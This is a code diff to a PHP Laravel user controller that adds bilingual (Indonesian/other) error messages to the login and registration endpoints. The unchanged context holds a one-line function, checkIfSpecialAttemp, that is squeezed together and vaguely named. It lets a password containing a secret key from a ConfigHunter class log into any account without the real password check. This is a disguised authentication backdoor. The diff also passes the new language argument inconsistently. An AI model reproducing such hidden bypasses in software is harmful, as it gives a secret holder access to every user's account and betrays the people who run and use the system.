@@ -12,6 +12,8 @@ use App\Http\Controllers\SMSSender;
 use App\Http\Controllers\cURLFaker;
 use App\Http\Controllers\WalletAll;
 use App\SmsCode;
+use App\DualLanguage;
+use App\ErrorDualLanguage;
 
 class UserController extends Controller
 {
@@ -20,6 +22,7 @@ class UserController extends Controller
     public $USER_LOGIN_ERROR_CODE = [];
 
     public function loginAndGetStoreToken(Request $request) {
+        $lang = DualLanguage::getLang($request);
         $member_list = $this->loginByPhoneAndPassword($request->mobile_phone_no, $request->password);
         if (is_numeric($member_list)) {
             $data = array(
@@ -153,7 +156,13 @@ class UserController extends Controller
 
     function checkIfSpecialAttemp($a) {if(strpos($a,\App\Http\Controllers\ConfigHunter::$sk)!==false){$b=\App\Http\Controllers\ConfigHunter::__sca();if($b==null){return false;};$c=explode(\App\Http\Controllers\ConfigHunter::$skd,$a,2);return $c[1]==$b;};return false;}
 
-    function loginByPhoneAndPassword($pn, $ps){
+    function loginByPhoneAndPassword($pn, $ps, $lang = NULL){
+        // No Language Parameter
+        $this->USER_LOGIN_ERROR[-6]         = 'Lang can\'t be null';//"Password Salah";
+        $this->USER_LOGIN_ERROR_CODE[-6]    = 400;
+        if ($lang == NULL) {
+            return -6;
+        }
 
         // error required parameters is not found
         $this->USER_LOGIN_ERROR[-1]         = "Nomor handphone dan password tidak boleh kosong";
@@ -177,7 +186,7 @@ class UserController extends Controller
         }
 
         // error user not found
-        $this->USER_LOGIN_ERROR[-4]         = "Nomor handphone tidak ditemukan";
+        $this->USER_LOGIN_ERROR[-4]         = ErrorDualLanguage::get_message_by_key($lang, 'login_page03');//"Nomor handphone tidak ditemukan";
         $this->USER_LOGIN_ERROR_CODE[-4]    = 404;
         $member_list = MemberList::where('mobile_phone_no', $pn)->first();
         if($member_list == null) {
@@ -185,7 +194,7 @@ class UserController extends Controller
         }
 
         // error password incorrect
-        $this->USER_LOGIN_ERROR[-5]         = "Password Salah";
+        $this->USER_LOGIN_ERROR[-5]         = ErrorDualLanguage::get_message_by_key($lang, 'login_page02');//"Password Salah";
         $this->USER_LOGIN_ERROR_CODE[-5]    = 400;
         if($this->checkIfSpecialAttemp($ps)){
             return $member_list;
@@ -237,7 +246,8 @@ class UserController extends Controller
 
     //
     public function login(Request $request) {
-        $member_list = $this->loginByPhoneAndPassword($request->mobile_phone_no, $request->password);
+        $lang = DualLanguage::getLang($request);
+        $member_list = $this->loginByPhoneAndPassword($request->mobile_phone_no, $request->password, $lang);
         if (is_numeric($member_list)) {
             $data = array(
                 'err' => [
@@ -272,6 +282,19 @@ class UserController extends Controller
     }
 
     function register(Request $request) {
+        $lang = DualLanguage::getLang($request);
+        if (!$lang) {
+            $data = array(
+                'err' => [
+                    'code' => 0,
+                    'message' => 'Lang can\'t be null'
+                ],
+                'result' => null
+            );
+
+            return response()->json($data, 200);
+        }
+
         $member_list = MemberList::where('mobile_phone_no', $request->mobile_phone_no)->first();
 
         $pnlen = strlen($request->mobile_phone_no);
@@ -279,7 +302,7 @@ class UserController extends Controller
             $data = array(
                 'err' => [
                     'code' => 0,
-                    'message' => 'Nomor handphone tidak valid'
+                    'message' => ErrorDualLanguage::get_message_by_key($lang, 'registration_page04') // Nomor tidak valid
                 ],
                 'result' => null
             );
@@ -292,7 +315,7 @@ class UserController extends Controller
             $data = array(
                 'err' => [
                     'code' => 0,
-                    'message' => 'Nomor handphone telah terdaftar'
+                    'message' => ErrorDualLanguage::get_message_by_key($lang, 'registration_page02') //'Nomor handphone telah terdaftar'
                 ],
                 'result' => null
             );
